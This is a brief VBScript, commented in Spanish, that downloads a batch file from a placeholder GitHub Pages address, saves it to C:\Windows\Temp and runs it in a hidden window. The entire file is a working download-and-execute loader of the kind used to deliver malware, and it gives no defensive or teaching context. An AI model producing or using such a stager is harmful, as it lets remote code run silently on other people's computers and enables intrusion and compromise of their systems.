Dim url, destination, objHTTP, objFSO, objFile, objShell

' URL del archivo batch en tu dominio
url = "https://tuusuario.github.io/repositorio/script.bat"

' Ruta donde se guardará el archivo en el sistema
destination = "C:\Windows\Temp\script.bat"

' Crear el objeto HTTP para descargar el archivo
Set objHTTP = CreateObject("MSXML2.XMLHTTP")
objHTTP.Open "GET", url, False
objHTTP.Send

' Guardar el archivo en el sistema
If objHTTP.Status = 200 Then
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    Set objFile = objFSO.CreateTextFile(destination, True)
    objFile.Write objHTTP.responseText
    objFile.Close
    
    ' Ejecutar el archivo .bat
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run destination, 0, False
End If

' Liberar objetos
Set objHTTP = Nothing
Set objFSO = Nothing
Set objFile = Nothing
Set objShell = Nothing
